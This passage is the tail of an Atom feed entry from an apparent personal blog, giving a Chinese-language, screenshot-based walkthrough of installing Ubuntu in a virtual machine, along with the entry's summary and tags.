<img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152342209.png" alt="image-20211225152342209"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152358941.png" alt="image-20211225152358941"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152409445.png" alt="image-20211225152409445"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152422670.png" alt="image-20211225152422670"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152620102.png" alt="image-20211225152620102"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152447496.png" alt="image-20211225152447496"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152637502.png" alt="image-20211225152637502"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152657553.png" alt="image-20211225152657553"></p><pre><code>   建议安装时，语言选择英文，然后默认“下一步（continue）”即可完成安装</code></pre><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152727579.png" alt="image-20211225152727579"></p><p>​        安装完成后，重新启动，即可正常使用 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;在虚拟机安装ubuntu系统&quot;&gt;&lt;a href=&quot;#在虚拟机安装ubuntu系统&quot; class=&quot;headerlink&quot; title=&quot;在虚拟机安装ubuntu系统&quot;&gt;&lt;/a&gt;在虚拟机安装ubuntu系统&lt;/h1&gt;&lt;p&gt;\1.   先到 &lt;a href=&quot;http</summary>
      
    
    
    
    
    <category term="虚拟机" scheme="http://aisibuhuipao.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    <category term="ubuntu" scheme="http://aisibuhuipao.github.io/tags/ubuntu/"/>
    
  </entry>
  
</feed>
